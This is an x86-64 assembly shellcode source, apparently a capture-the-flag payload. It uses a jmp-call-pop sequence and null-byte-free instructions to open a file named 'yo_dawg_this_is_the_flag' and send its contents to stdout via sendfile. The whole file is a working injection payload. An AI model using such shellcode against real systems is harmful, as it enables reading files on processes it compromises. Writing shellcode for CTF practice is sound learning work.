BITS 64
global _start

section .text

_start:
jmp short _push_filename

_readfile:
pop rsi

;openat 2 (rdi, rsi, rdx,r10)
xor rax, rax
xor rdi, rdi
mov rdi, 0xFFFFFFFFFFFFFF9C
xor r10, r10
xor rdx, rdx
add ax, 257
syscall

;sendfile(out_fd, in_fd, off, cnt)
xor rdi, rdi
inc rdi
mov rsi, rax
xor rdx, rdx
xor r10,r10
xor rbx, rbx
add bl ,0xff
add r10, rbx
xor rax, rax
add ax,40
syscall

_exit:
xor rdi, rdi
xor rax, rax
add al, 60
syscall


_push_filename:
call _readfile
db 'yo_dawg_this_is_the_flag'
